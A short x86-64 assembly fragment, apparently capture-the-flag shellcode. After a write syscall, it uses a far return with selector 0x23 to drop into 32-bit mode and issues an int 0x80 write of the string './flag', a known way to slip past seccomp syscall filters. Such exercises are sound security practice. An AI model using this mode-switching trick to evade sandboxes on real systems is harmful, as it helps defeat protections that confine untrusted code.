_start:
  xor rax, rax
  mov al, 0x1
  mov dil, al
  xor rsi, rsi
  mov rsi, 0x10000
  xor rdx, rdx
  mov dl, 0x10
  syscall

	mov DWORD [rsp+0x4], 0x23
  mov DWORD [rsp], .L1
  retf

.L1:
	mov ebx, 0x1
	mov eax, 0x4
	mov ecx, file
  mov edx, 0x6
	int 0x80                      ; sys_write

file:  db "./flag",0
